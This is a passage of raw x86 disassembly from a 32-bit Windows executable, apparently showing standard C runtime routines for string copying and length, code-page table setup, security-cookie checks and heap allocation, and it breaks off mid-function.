  4255ea:	push   edi
  4255eb:	call   esi
  4255ed:	mov    ds:0x46733c,eax
  4255f2:	mov    eax,ds:0x46733c
  4255f7:	test   eax,eax
  4255f9:	je     0x425637
  4255fb:	call   eax
  4255fd:	test   eax,eax
  4255ff:	je     0x42561e
  425601:	lea    ecx,[ebp-0x4]
  425604:	push   ecx
  425605:	push   0xc
  425607:	lea    ecx,[ebp-0x10]
  42560a:	push   ecx
  42560b:	push   0x1
  42560d:	push   eax
  42560e:	call   DWORD PTR ds:0x467340
  425614:	test   eax,eax
  425616:	je     0x42561e
  425618:	test   BYTE PTR [ebp-0x8],0x1
  42561c:	jne    0x425637
  42561e:	cmp    DWORD PTR ds:0x467090,0x4
  425625:	jb     0x425631
  425627:	or     BYTE PTR [ebp+0x12],0x20
  42562b:	jmp    0x425656
  42562d:	xor    eax,eax
  42562f:	jmp    0x425666
  425631:	or     BYTE PTR [ebp+0x12],0x4
  425635:	jmp    0x425656
  425637:	mov    eax,ds:0x467334
  42563c:	test   eax,eax
  42563e:	je     0x425656
  425640:	call   eax
  425642:	mov    ebx,eax
  425644:	test   ebx,ebx
  425646:	je     0x425656
  425648:	mov    eax,ds:0x467338
  42564d:	test   eax,eax
  42564f:	je     0x425656
  425651:	push   ebx
  425652:	call   eax
  425654:	mov    ebx,eax
  425656:	push   DWORD PTR [ebp+0x10]
  425659:	push   DWORD PTR [ebp+0xc]
  42565c:	push   DWORD PTR [ebp+0x8]
  42565f:	push   ebx
  425660:	call   DWORD PTR ds:0x467330
  425666:	pop    edi
  425667:	pop    esi
  425668:	pop    ebx
  425669:	leave  
  42566a:	ret    
  42566b:	int3   
  42566c:	int3   
  42566d:	int3   
  42566e:	int3   
  42566f:	int3   
  425670:	push   edi
  425671:	mov    edi,DWORD PTR [esp+0x8]
  425675:	jmp    0x4256e5
  425677:	lea    esp,[esp+0x0]
  42567e:	mov    edi,edi
  425680:	mov    ecx,DWORD PTR [esp+0x4]
  425684:	push   edi
  425685:	test   ecx,0x3
  42568b:	je     0x4256a0
  42568d:	mov    al,BYTE PTR [ecx]
  42568f:	add    ecx,0x1
  425692:	test   al,al
  425694:	je     0x4256d3
  425696:	test   ecx,0x3
  42569c:	jne    0x42568d
  42569e:	mov    edi,edi
  4256a0:	mov    eax,DWORD PTR [ecx]
  4256a2:	mov    edx,0x7efefeff
  4256a7:	add    edx,eax
  4256a9:	xor    eax,0xffffffff
  4256ac:	xor    eax,edx
  4256ae:	add    ecx,0x4
  4256b1:	test   eax,0x81010100
  4256b6:	je     0x4256a0
  4256b8:	mov    eax,DWORD PTR [ecx-0x4]
  4256bb:	test   al,al
  4256bd:	je     0x4256e2
  4256bf:	test   ah,ah
  4256c1:	je     0x4256dd
  4256c3:	test   eax,0xff0000
  4256c8:	je     0x4256d8
  4256ca:	test   eax,0xff000000
  4256cf:	je     0x4256d3
  4256d1:	jmp    0x4256a0
  4256d3:	lea    edi,[ecx-0x1]
  4256d6:	jmp    0x4256e5
  4256d8:	lea    edi,[ecx-0x2]
  4256db:	jmp    0x4256e5
  4256dd:	lea    edi,[ecx-0x3]
  4256e0:	jmp    0x4256e5
  4256e2:	lea    edi,[ecx-0x4]
  4256e5:	mov    ecx,DWORD PTR [esp+0xc]
  4256e9:	test   ecx,0x3
  4256ef:	je     0x42570e
  4256f1:	mov    dl,BYTE PTR [ecx]
  4256f3:	add    ecx,0x1
  4256f6:	test   dl,dl
  4256f8:	je     0x425760
  4256fa:	mov    BYTE PTR [edi],dl
  4256fc:	add    edi,0x1
  4256ff:	test   ecx,0x3
  425705:	jne    0x4256f1
  425707:	jmp    0x42570e
  425709:	mov    DWORD PTR [edi],edx
  42570b:	add    edi,0x4
  42570e:	mov    edx,0x7efefeff
  425713:	mov    eax,DWORD PTR [ecx]
  425715:	add    edx,eax
  425717:	xor    eax,0xffffffff
  42571a:	xor    eax,edx
  42571c:	mov    edx,DWORD PTR [ecx]
  42571e:	add    ecx,0x4
  425721:	test   eax,0x81010100
  425726:	je     0x425709
  425728:	test   dl,dl
  42572a:	je     0x425760
  42572c:	test   dh,dh
  42572e:	je     0x425757
  425730:	test   edx,0xff0000
  425736:	je     0x42574a
  425738:	test   edx,0xff000000
  42573e:	je     0x425742
  425740:	jmp    0x425709
  425742:	mov    DWORD PTR [edi],edx
  425744:	mov    eax,DWORD PTR [esp+0x8]
  425748:	pop    edi
  425749:	ret    
  42574a:	mov    WORD PTR [edi],dx
  42574d:	mov    eax,DWORD PTR [esp+0x8]
  425751:	mov    BYTE PTR [edi+0x2],0x0
  425755:	pop    edi
  425756:	ret    
  425757:	mov    WORD PTR [edi],dx
  42575a:	mov    eax,DWORD PTR [esp+0x8]
  42575e:	pop    edi
  42575f:	ret    
  425760:	mov    BYTE PTR [edi],dl
  425762:	mov    eax,DWORD PTR [esp+0x8]
  425766:	pop    edi
  425767:	ret    
  425768:	int3   
  425769:	int3   
  42576a:	int3   
  42576b:	int3   
  42576c:	int3   
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	mov    ecx,DWORD PTR [esp+0xc]
  425774:	push   edi
  425775:	test   ecx,ecx
  425777:	je     0x42580f
  42577d:	push   esi
  42577e:	push   ebx
  42577f:	mov    ebx,ecx
  425781:	mov    esi,DWORD PTR [esp+0x14]
  425785:	test   esi,0x3
  42578b:	mov    edi,DWORD PTR [esp+0x10]
  42578f:	jne    0x42579c
  425791:	shr    ecx,0x2
  425794:	jne    0x42581f
  42579a:	jmp    0x4257c3
  42579c:	mov    al,BYTE PTR [esi]
  42579e:	add    esi,0x1
  4257a1:	mov    BYTE PTR [edi],al
  4257a3:	add    edi,0x1
  4257a6:	sub    ecx,0x1
  4257a9:	je     0x4257d6
  4257ab:	test   al,al
  4257ad:	je     0x4257de
  4257af:	test   esi,0x3
  4257b5:	jne    0x42579c
  4257b7:	mov    ebx,ecx
  4257b9:	shr    ecx,0x2
  4257bc:	jne    0x42581f
  4257be:	and    ebx,0x3
  4257c1:	je     0x4257d6
  4257c3:	mov    al,BYTE PTR [esi]
  4257c5:	add    esi,0x1
  4257c8:	mov    BYTE PTR [edi],al
  4257ca:	add    edi,0x1
  4257cd:	test   al,al
  4257cf:	je     0x425808
  4257d1:	sub    ebx,0x1
  4257d4:	jne    0x4257c3
  4257d6:	mov    eax,DWORD PTR [esp+0x10]
  4257da:	pop    ebx
  4257db:	pop    esi
  4257dc:	pop    edi
  4257dd:	ret    
  4257de:	test   edi,0x3
  4257e4:	je     0x4257fc
  4257e6:	mov    BYTE PTR [edi],al
  4257e8:	add    edi,0x1
  4257eb:	sub    ecx,0x1
  4257ee:	je     0x42588c
  4257f4:	test   edi,0x3
  4257fa:	jne    0x4257e6
  4257fc:	mov    ebx,ecx
  4257fe:	shr    ecx,0x2
  425801:	jne    0x425877
  425803:	mov    BYTE PTR [edi],al
  425805:	add    edi,0x1
  425808:	sub    ebx,0x1
  42580b:	jne    0x425803
  42580d:	pop    ebx
  42580e:	pop    esi
  42580f:	mov    eax,DWORD PTR [esp+0x8]
  425813:	pop    edi
  425814:	ret    
  425815:	mov    DWORD PTR [edi],edx
  425817:	add    edi,0x4
  42581a:	sub    ecx,0x1
  42581d:	je     0x4257be
  42581f:	mov    edx,0x7efefeff
  425824:	mov    eax,DWORD PTR [esi]
  425826:	add    edx,eax
  425828:	xor    eax,0xffffffff
  42582b:	xor    eax,edx
  42582d:	mov    edx,DWORD PTR [esi]
  42582f:	add    esi,0x4
  425832:	test   eax,0x81010100
  425837:	je     0x425815
  425839:	test   dl,dl
  42583b:	je     0x425869
  42583d:	test   dh,dh
  42583f:	je     0x42585f
  425841:	test   edx,0xff0000
  425847:	je     0x425855
  425849:	test   edx,0xff000000
  42584f:	jne    0x425815
  425851:	mov    DWORD PTR [edi],edx
  425853:	jmp    0x42586d
  425855:	and    edx,0xffff
  42585b:	mov    DWORD PTR [edi],edx
  42585d:	jmp    0x42586d
  42585f:	and    edx,0xff
  425865:	mov    DWORD PTR [edi],edx
  425867:	jmp    0x42586d
  425869:	xor    edx,edx
  42586b:	mov    DWORD PTR [edi],edx
  42586d:	add    edi,0x4
  425870:	xor    eax,eax
  425872:	sub    ecx,0x1
  425875:	je     0x425883
  425877:	xor    eax,eax
  425879:	mov    DWORD PTR [edi],eax
  42587b:	add    edi,0x4
  42587e:	sub    ecx,0x1
  425881:	jne    0x425879
  425883:	and    ebx,0x3
  425886:	jne    0x425803
  42588c:	mov    eax,DWORD PTR [esp+0x10]
  425890:	pop    ebx
  425891:	pop    esi
  425892:	pop    edi
  425893:	ret    
  425894:	int3   
  425895:	int3   
  425896:	int3   
  425897:	int3   
  425898:	int3   
  425899:	int3   
  42589a:	int3   
  42589b:	int3   
  42589c:	int3   
  42589d:	int3   
  42589e:	int3   
  42589f:	int3   
  4258a0:	mov    ecx,DWORD PTR [esp+0x4]
  4258a4:	test   ecx,0x3
  4258aa:	je     0x4258d0
  4258ac:	mov    al,BYTE PTR [ecx]
  4258ae:	add    ecx,0x1
  4258b1:	test   al,al
  4258b3:	je     0x425903
  4258b5:	test   ecx,0x3
  4258bb:	jne    0x4258ac
  4258bd:	add    eax,0x0
  4258c2:	lea    esp,[esp+0x0]
  4258c9:	lea    esp,[esp+0x0]
  4258d0:	mov    eax,DWORD PTR [ecx]
  4258d2:	mov    edx,0x7efefeff
  4258d7:	add    edx,eax
  4258d9:	xor    eax,0xffffffff
  4258dc:	xor    eax,edx
  4258de:	add    ecx,0x4
  4258e1:	test   eax,0x81010100
  4258e6:	je     0x4258d0
  4258e8:	mov    eax,DWORD PTR [ecx-0x4]
  4258eb:	test   al,al
  4258ed:	je     0x425921
  4258ef:	test   ah,ah
  4258f1:	je     0x425917
  4258f3:	test   eax,0xff0000
  4258f8:	je     0x42590d
  4258fa:	test   eax,0xff000000
  4258ff:	je     0x425903
  425901:	jmp    0x4258d0
  425903:	lea    eax,[ecx-0x1]
  425906:	mov    ecx,DWORD PTR [esp+0x4]
  42590a:	sub    eax,ecx
  42590c:	ret    
  42590d:	lea    eax,[ecx-0x2]
  425910:	mov    ecx,DWORD PTR [esp+0x4]
  425914:	sub    eax,ecx
  425916:	ret    
  425917:	lea    eax,[ecx-0x3]
  42591a:	mov    ecx,DWORD PTR [esp+0x4]
  42591e:	sub    eax,ecx
  425920:	ret    
  425921:	lea    eax,[ecx-0x4]
  425924:	mov    ecx,DWORD PTR [esp+0x4]
  425928:	sub    eax,ecx
  42592a:	ret    
  42592b:	push   0x8
  42592d:	push   0x4295a0
  425932:	call   0x425290
  425937:	and    DWORD PTR [ebp-0x4],0x0
  42593b:	push   0x0
  42593d:	push   0x1
  42593f:	call   0x4274b2
  425944:	pop    ecx
  425945:	pop    ecx
  425946:	jmp    0x42594f
  425948:	xor    eax,eax
  42594a:	inc    eax
  42594b:	ret    
  42594c:	mov    esp,DWORD PTR [ebp-0x18]
  42594f:	or     DWORD PTR [ebp-0x4],0xffffffff
  425953:	push   0x3
  425955:	call   DWORD PTR ds:0x429070
  42595b:	int3   
  42595c:	cmp    ecx,DWORD PTR ds:0x4669f0
  425962:	jne    0x425965
  425964:	ret    
  425965:	jmp    0x42592b
  42596a:	movzx  eax,BYTE PTR [esp+0x4]
  42596f:	mov    cl,BYTE PTR [esp+0xc]
  425973:	test   BYTE PTR [eax+0x4674e1],cl
  425979:	jne    0x425997
  42597b:	cmp    DWORD PTR [esp+0x8],0x0
  425980:	je     0x425990
  425982:	movzx  eax,WORD PTR [eax*2+0x42999a]
  42598a:	and    eax,DWORD PTR [esp+0x8]
  42598e:	jmp    0x425992
  425990:	xor    eax,eax
  425992:	test   eax,eax
  425994:	jne    0x425997
  425996:	ret    
  425997:	xor    eax,eax
  425999:	inc    eax
  42599a:	ret    
  42599b:	push   0x4
  42599d:	push   0x0
  42599f:	push   DWORD PTR [esp+0xc]
  4259a3:	call   0x42596a
  4259a8:	add    esp,0xc
  4259ab:	ret    
  4259ac:	sub    eax,0x3a4
  4259b1:	je     0x4259d5
  4259b3:	sub    eax,0x4
  4259b6:	je     0x4259cf
  4259b8:	sub    eax,0xd
  4259bb:	je     0x4259c9
  4259bd:	dec    eax
  4259be:	je     0x4259c3
  4259c0:	xor    eax,eax
  4259c2:	ret    
  4259c3:	mov    eax,0x404
  4259c8:	ret    
  4259c9:	mov    eax,0x412
  4259ce:	ret    
  4259cf:	mov    eax,0x804
  4259d4:	ret    
  4259d5:	mov    eax,0x411
  4259da:	ret    
  4259db:	push   edi
  4259dc:	push   0x40
  4259de:	xor    eax,eax
  4259e0:	pop    ecx
  4259e1:	mov    edi,0x4674e0
  4259e6:	rep stos DWORD PTR es:[edi],eax
  4259e8:	stos   BYTE PTR es:[edi],al
  4259e9:	xor    eax,eax
  4259eb:	mov    ds:0x4675e4,eax
  4259f0:	mov    ds:0x4674dc,eax
  4259f5:	mov    ds:0x4674d4,eax
  4259fa:	mov    edi,0x4675f0
  4259ff:	stos   DWORD PTR es:[edi],eax
  425a00:	stos   DWORD PTR es:[edi],eax
  425a01:	stos   DWORD PTR es:[edi],eax
  425a02:	pop    edi
  425a03:	ret    
  425a04:	push   ebp
  425a05:	mov    ebp,esp
  425a07:	sub    esp,0x518
  425a0d:	mov    eax,ds:0x4669f0
  425a12:	xor    eax,DWORD PTR [ebp+0x4]
  425a15:	push   esi
  425a16:	mov    DWORD PTR [ebp-0x4],eax
  425a19:	lea    eax,[ebp-0x18]
  425a1c:	push   eax
  425a1d:	push   DWORD PTR ds:0x4675e4
  425a23:	call   DWORD PTR ds:0x4290d8
  425a29:	cmp    eax,0x1
  425a2c:	mov    esi,0x100
  425a31:	jne    0x425b44
  425a37:	xor    eax,eax
  425a39:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425a40:	inc    eax
  425a41:	cmp    eax,esi
  425a43:	jb     0x425a39
  425a45:	mov    al,BYTE PTR [ebp-0x12]
  425a48:	test   al,al
  425a4a:	mov    BYTE PTR [ebp-0x118],0x20
  425a51:	je     0x425a89
  425a53:	push   ebx
  425a54:	lea    edx,[ebp-0x11]
  425a57:	push   edi
  425a58:	movzx  ecx,BYTE PTR [edx]
  425a5b:	movzx  eax,al
  425a5e:	cmp    eax,ecx
  425a60:	ja     0x425a7f
  425a62:	sub    ecx,eax
  425a64:	inc    ecx
  425a65:	mov    ebx,ecx
  425a67:	shr    ecx,0x2
  425a6a:	lea    edi,[ebp+eax*1-0x118]
  425a71:	mov    eax,0x20202020
  425a76:	rep stos DWORD PTR es:[edi],eax
  425a78:	mov    ecx,ebx
  425a7a:	and    ecx,0x3
  425a7d:	rep stos BYTE PTR es:[edi],al
  425a7f:	inc    edx
  425a80:	mov    al,BYTE PTR [edx]
  425a82:	inc    edx
  425a83:	test   al,al
  425a85:	jne    0x425a58
  425a87:	pop    edi
  425a88:	pop    ebx
  425a89:	push   0x0
  425a8b:	push   DWORD PTR ds:0x4674d4
  425a91:	lea    eax,[ebp-0x518]
  425a97:	push   DWORD PTR ds:0x4675e4
  425a9d:	push   eax
  425a9e:	push   esi
  425a9f:	lea    eax,[ebp-0x118]
  425aa5:	push   eax
  425aa6:	push   0x1
  425aa8:	call   0x4279b8
  425aad:	push   0x0
  425aaf:	push   DWORD PTR ds:0x4675e4
  425ab5:	lea    eax,[ebp-0x218]
  425abb:	push   esi
  425abc:	push   eax
  425abd:	push   esi
  425abe:	lea    eax,[ebp-0x118]
  425ac4:	push   eax
  425ac5:	push   esi
  425ac6:	push   DWORD PTR ds:0x4674d4
  425acc:	call   0x4275fc
  425ad1:	push   0x0
  425ad3:	push   DWORD PTR ds:0x4675e4
  425ad9:	lea    eax,[ebp-0x318]
  425adf:	push   esi
  425ae0:	push   eax
  425ae1:	push   esi
  425ae2:	lea    eax,[ebp-0x118]
  425ae8:	push   eax
  425ae9:	push   0x200
  425aee:	push   DWORD PTR ds:0x4674d4
  425af4:	call   0x4275fc
  425af9:	add    esp,0x5c
  425afc:	xor    eax,eax
  425afe:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425b06:	test   cl,0x1
  425b09:	je     0x425b21
  425b0b:	or     BYTE PTR [eax+0x4674e1],0x10
  425b12:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425b19:	mov    BYTE PTR [eax+0x467600],cl
  425b1f:	jmp    0x425b3d
  425b21:	test   cl,0x2
  425b24:	je     0x425b36
  425b26:	or     BYTE PTR [eax+0x4674e1],0x20
  425b2d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425b34:	jmp    0x425b19
  425b36:	and    BYTE PTR [eax+0x467600],0x0
  425b3d:	inc    eax
  425b3e:	cmp    eax,esi
  425b40:	jb     0x425afe
  425b42:	jmp    0x425b88
  425b44:	xor    eax,eax
  425b46:	cmp    eax,0x41
  425b49:	jb     0x425b64
  425b4b:	cmp    eax,0x5a
  425b4e:	ja     0x425b64
  425b50:	or     BYTE PTR [eax+0x4674e1],0x10
  425b57:	mov    cl,al
  425b59:	add    cl,0x20
  425b5c:	mov    BYTE PTR [eax+0x467600],cl
  425b62:	jmp    0x425b83
  425b64:	cmp    eax,0x61
  425b67:	jb     0x425b7c
  425b69:	cmp    eax,0x7a
  425b6c:	ja     0x425b7c
  425b6e:	or     BYTE PTR [eax+0x4674e1],0x20
  425b75:	mov    cl,al
  425b77:	sub    cl,0x20
  425b7a:	jmp    0x425b5c
  425b7c:	and    BYTE PTR [eax+0x467600],0x0
  425b83:	inc    eax
  425b84:	cmp    eax,esi
  425b86:	jb     0x425b46
  425b88:	mov    ecx,DWORD PTR [ebp-0x4]
  425b8b:	xor    ecx,DWORD PTR [ebp+0x4]
  425b8e:	pop    esi
  425b8f:	call   0x42595c
  425b94:	leave  
  425b95:	ret    
  425b96:	push   ebp
  425b97:	mov    ebp,esp
  425b99:	sub    esp,0x1c
  425b9c:	mov    eax,ds:0x4669f0
  425ba1:	xor    eax,DWORD PTR [ebp+0x4]
  425ba4:	push   ebx
  425ba5:	push   esi
  425ba6:	mov    esi,DWORD PTR [ebp+0x8]
  425ba9:	xor    ebx,ebx
  425bab:	cmp    esi,ebx
  425bad:	mov    DWORD PTR [ebp-0x4],eax
  425bb0:	push   edi
  425bb1:	je     0x425d0b
  425bb7:	xor    edx,edx
  425bb9:	xor    eax,eax
  425bbb:	cmp    DWORD PTR [eax+0x466a00],esi
  425bc1:	je     0x425c28
  425bc3:	add    eax,0x30
  425bc6:	inc    edx
  425bc7:	cmp    eax,0xf0
  425bcc:	jb     0x425bbb
  425bce:	lea    eax,[ebp-0x1c]
  425bd1:	push   eax
  425bd2:	push   esi
  425bd3:	call   DWORD PTR ds:0x4290d8
  425bd9:	cmp    eax,0x1
  425bdc:	jne    0x425d03
  425be2:	push   0x40
  425be4:	xor    eax,eax
  425be6:	cmp    DWORD PTR [ebp-0x1c],0x1
  425bea:	pop    ecx
  425beb:	mov    edi,0x4674e0
  425bf0:	rep stos DWORD PTR es:[edi],eax
  425bf2:	stos   BYTE PTR es:[edi],al
  425bf3:	mov    DWORD PTR ds:0x4675e4,esi
  425bf9:	mov    DWORD PTR ds:0x4674d4,ebx
  425bff:	jbe    0x425cf1
  425c05:	cmp    BYTE PTR [ebp-0x16],0x0
  425c09:	je     0x425cc9
  425c0f:	lea    ecx,[ebp-0x15]
  425c12:	mov    dl,BYTE PTR [ecx]
  425c14:	test   dl,dl
  425c16:	je     0x425cc9
  425c1c:	movzx  eax,BYTE PTR [ecx-0x1]
  425c20:	movzx  edx,dl
  425c23:	jmp    0x425cb9
  425c28:	push   0x40
  425c2a:	xor    eax,eax
  425c2c:	pop    ecx
  425c2d:	mov    edi,0x4674e0
  425c32:	rep stos DWORD PTR es:[edi],eax
  425c34:	lea    ecx,[edx+edx*2]
  425c37:	shl    ecx,0x4
  425c3a:	mov    DWORD PTR [ebp-0x8],ebx
  425c3d:	stos   BYTE PTR es:[edi],al
  425c3e:	lea    ebx,[ecx+0x466a10]
  425c44:	mov    al,BYTE PTR [ebx]
  425c46:	mov    esi,ebx
  425c48:	jmp    0x425c73
  425c4a:	mov    dl,BYTE PTR [esi+0x1]
  425c4d:	test   dl,dl
  425c4f:	je     0x425c77
  425c51:	movzx  eax,al
  425c54:	movzx  edi,dl
  425c57:	cmp    eax,edi
  425c59:	ja     0x425c6f
  425c5b:	mov    edx,DWORD PTR [ebp-0x8]
  425c5e:	mov    dl,BYTE PTR [edx+0x4669f8]
  425c64:	or     BYTE PTR [eax+0x4674e1],dl
  425c6a:	inc    eax
  425c6b:	cmp    eax,edi
  425c6d:	jbe    0x425c64
  425c6f:	inc    esi
  425c70:	inc    esi
  425c71:	mov    al,BYTE PTR [esi]
  425c73:	test   al,al
  425c75:	jne    0x425c4a
  425c77:	inc    DWORD PTR [ebp-0x8]
  425c7a:	add    ebx,0x8
  425c7d:	cmp    DWORD PTR [ebp-0x8],0x4
  425c81:	jb     0x425c44
  425c83:	mov    eax,DWORD PTR [ebp+0x8]
  425c86:	mov    ds:0x4675e4,eax
  425c8b:	mov    DWORD PTR ds:0x4674dc,0x1
  425c95:	call   0x4259ac
  425c9a:	lea    ecx,[ecx+0x466a04]
  425ca0:	mov    esi,ecx
  425ca2:	mov    edi,0x4675f0
  425ca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ca9:	mov    ds:0x4674d4,eax
  425cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425caf:	jmp    0x425d10
  425cb1:	or     BYTE PTR [eax+0x4674e1],0x4
  425cb8:	inc    eax
  425cb9:	cmp    eax,edx
  425cbb:	jbe    0x425cb1
  425cbd:	inc    ecx
  425cbe:	inc    ecx
  425cbf:	cmp    BYTE PTR [ecx-0x1],0x0
  425cc3:	jne    0x425c12
  425cc9:	xor    ecx,ecx
  425ccb:	inc    ecx
  425ccc:	mov    eax,ecx
  425cce:	or     BYTE PTR [eax+0x4674e1],0x8
  425cd5:	inc    eax
  425cd6:	cmp    eax,0xff
  425cdb:	jb     0x425cce
  425cdd:	mov    eax,esi
  425cdf:	call   0x4259ac
  425ce4:	mov    ds:0x4674d4,eax
  425ce9:	mov    DWORD PTR ds:0x4674dc,ecx
  425cef:	jmp    0x425cf7
  425cf1:	mov    DWORD PTR ds:0x4674dc,ebx
  425cf7:	xor    eax,eax
  425cf9:	mov    edi,0x4675f0
  425cfe:	stos   DWORD PTR es:[edi],eax
  425cff:	stos   DWORD PTR es:[edi],eax
  425d00:	stos   DWORD PTR es:[edi],eax
  425d01:	jmp    0x425d10
  425d03:	cmp    DWORD PTR ds:0x467344,ebx
  425d09:	je     0x425d19
  425d0b:	call   0x4259db
  425d10:	call   0x425a04
  425d15:	xor    eax,eax
  425d17:	jmp    0x425d1c
  425d19:	or     eax,0xffffffff
  425d1c:	mov    ecx,DWORD PTR [ebp-0x4]
  425d1f:	xor    ecx,DWORD PTR [ebp+0x4]
  425d22:	pop    edi
  425d23:	pop    esi
  425d24:	pop    ebx
  425d25:	call   0x42595c
  425d2a:	leave  
  425d2b:	ret    
  425d2c:	push   0x14
  425d2e:	push   0x4295b0
  425d33:	call   0x425290
  425d38:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425d3c:	push   0xd
  425d3e:	call   0x42544f
  425d43:	pop    ecx
  425d44:	xor    edi,edi
  425d46:	mov    DWORD PTR [ebp-0x4],edi
  425d49:	mov    DWORD PTR ds:0x467344,edi
  425d4f:	mov    eax,DWORD PTR [ebp+0x8]
  425d52:	cmp    eax,0xfffffffe
  425d55:	jne    0x425d69
  425d57:	mov    DWORD PTR ds:0x467344,0x1
  425d61:	call   DWORD PTR ds:0x4290d4
  425d67:	jmp    0x425d94
  425d69:	cmp    eax,0xfffffffd
  425d6c:	jne    0x425d80
  425d6e:	mov    DWORD PTR ds:0x467344,0x1
  425d78:	call   DWORD PTR ds:0x4290d0
  425d7e:	jmp    0x425d94
  425d80:	cmp    eax,0xfffffffc
  425d83:	jne    0x425d94
  425d85:	mov    DWORD PTR ds:0x467344,0x1
  425d8f:	mov    eax,ds:0x467374
  425d94:	mov    DWORD PTR [ebp+0x8],eax
  425d97:	cmp    eax,DWORD PTR ds:0x4675e4
  425d9d:	je     0x425e5e
  425da3:	mov    esi,DWORD PTR ds:0x4674d8
  425da9:	mov    DWORD PTR [ebp-0x20],esi
  425dac:	cmp    esi,edi
  425dae:	je     0x425db4
  425db0:	cmp    DWORD PTR [esi],edi
  425db2:	je     0x425dc4
  425db4:	push   0x220
  425db9:	call   0x425fb2
  425dbe:	pop    ecx
  425dbf:	mov    esi,eax
  425dc1:	mov    DWORD PTR [ebp-0x20],esi
  425dc4:	cmp    esi,edi
  425dc6:	je     0x425e47
  425dc8:	push   DWORD PTR [ebp+0x8]
  425dcb:	call   0x425b96
  425dd0:	pop    ecx
  425dd1:	mov    DWORD PTR [ebp-0x1c],eax
  425dd4:	cmp    eax,edi
  425dd6:	jne    0x425e47
  425dd8:	mov    DWORD PTR [esi],edi
  425dda:	mov    eax,ds:0x4675e4
  425ddf:	mov    DWORD PTR [esi+0x4],eax
  425de2:	mov    eax,ds:0x4674dc
  425de7:	mov    DWORD PTR [esi+0x8],eax
  425dea:	mov    eax,ds:0x4674d4
  425def:	mov    DWORD PTR [esi+0xc],eax
  425df2:	xor    eax,eax
  425df4:	mov    DWORD PTR [ebp-0x24],eax
  425df7:	cmp    eax,0x5
  425dfa:	jge    0x425e0c
  425dfc:	mov    cx,WORD PTR [eax*2+0x4675f0]
  425e04:	mov    WORD PTR [esi+eax*2+0x10],cx
  425e09:	inc    eax
  425e0a:	jmp    0x425df4
  425e0c:	xor    eax,eax
  425e0e:	mov    DWORD PTR [ebp-0x24],eax
  425e11:	cmp    eax,0x101
  425e16:	jge    0x425e25
  425e18:	mov    cl,BYTE PTR [eax+0x4674e0]
  425e1e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425e22:	inc    eax
  425e23:	jmp    0x425e0e
  425e25:	xor    eax,eax
  425e27:	mov    DWORD PTR [ebp-0x24],eax
  425e2a:	cmp    eax,0x100
  425e2f:	jge    0x425e41
  425e31:	mov    cl,BYTE PTR [eax+0x467600]
  425e37:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425e3e:	inc    eax
  425e3f:	jmp    0x425e27
  425e41:	mov    DWORD PTR ds:0x4674d8,esi
  425e47:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425e4b:	jne    0x425e61
  425e4d:	cmp    esi,DWORD PTR ds:0x4674d8
  425e53:	je     0x425e61
  425e55:	push   esi
  425e56:	call   0x425e9a
  425e5b:	pop    ecx
  425e5c:	jmp    0x425e61
  425e5e:	mov    DWORD PTR [ebp-0x1c],edi
  425e61:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e65:	call   0x425e73
  425e6a:	mov    eax,DWORD PTR [ebp-0x1c]
  425e6d:	call   0x4252cb
  425e72:	ret    
  425e73:	push   0xd
  425e75:	call   0x4253bb
  425e7a:	pop    ecx
  425e7b:	ret    
  425e7c:	cmp    DWORD PTR ds:0x46782c,0x0
  425e83:	jne    0x425e97
  425e85:	push   0xfffffffd
  425e87:	call   0x425d2c
  425e8c:	pop    ecx
  425e8d:	mov    DWORD PTR ds:0x46782c,0x1
  425e97:	xor    eax,eax
  425e99:	ret    
  425e9a:	push   0xc
  425e9c:	push   0x4295c0
  425ea1:	call   0x425290
  425ea6:	mov    esi,DWORD PTR [ebp+0x8]
  425ea9:	test   esi,esi
  425eab:	je     0x425f05
  425ead:	cmp    DWORD PTR ds:0x467704,0x3
  425eb4:	jne    0x425ef6
  425eb6:	push   0x4
  425eb8:	call   0x42544f
  425ebd:	pop    ecx
  425ebe:	and    DWORD PTR [ebp-0x4],0x0
  425ec2:	push   esi
  425ec3:	call   0x426672
  425ec8:	pop    ecx
  425ec9:	mov    DWORD PTR [ebp-0x1c],eax
  425ecc:	test   eax,eax
  425ece:	je     0x425ed9
  425ed0:	push   esi
  425ed1:	push   eax
  425ed2:	call   0x42669d
  425ed7:	pop    ecx
  425ed8:	pop    ecx
  425ed9:	or     DWORD PTR [ebp-0x4],0xffffffff
  425edd:	call   0x425eed
  425ee2:	cmp    DWORD PTR [ebp-0x1c],0x0
  425ee6:	jne    0x425f05
  425ee8:	push   DWORD PTR [ebp+0x8]
  425eeb:	jmp    0x425ef7
  425eed:	push   0x4
  425eef:	call   0x4253bb
  425ef4:	pop    ecx
  425ef5:	ret    
  425ef6:	push   esi
  425ef7:	push   0x0
  425ef9:	push   DWORD PTR ds:0x467700
  425eff:	call   DWORD PTR ds:0x429058
  425f05:	call   0x4252cb
  425f0a:	ret    
  425f0b:	push   0xc
  425f0d:	push   0x4295d0
  425f12:	call   0x425290
  425f17:	mov    esi,DWORD PTR [ebp+0x8]
  425f1a:	cmp    DWORD PTR ds:0x467704,0x3
  425f21:	jne    0x425f51
  425f23:	cmp    esi,DWORD PTR ds:0x4674c4
  425f29:	ja     0x425f51
  425f2b:	push   0x4
  425f2d:	call   0x42544f
  425f32:	pop    ecx
  425f33:	and    DWORD PTR [ebp-0x4],0x0
  425f37:	push   esi
  425f38:	call   0x426e51
  425f3d:	pop    ecx
  425f3e:	mov    DWORD PTR [ebp-0x1c],eax
  425f41:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f45:	call   0x425f7d
  425f4a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f4d:	test   eax,eax
  425f4f:	jne    0x425f74
  425f51:	test   esi,esi
  425f53:	jne    0x425f56
  425f55:	inc    esi
  425f56:	cmp    DWORD PTR ds:0x467704,0x1
  425f5d:	je     0x425f65
  425f5f:	add    esi,0xf
  425f62:	and    esi,0xfffffff0
  425f65:	push   esi
  425f66:	push   0x0
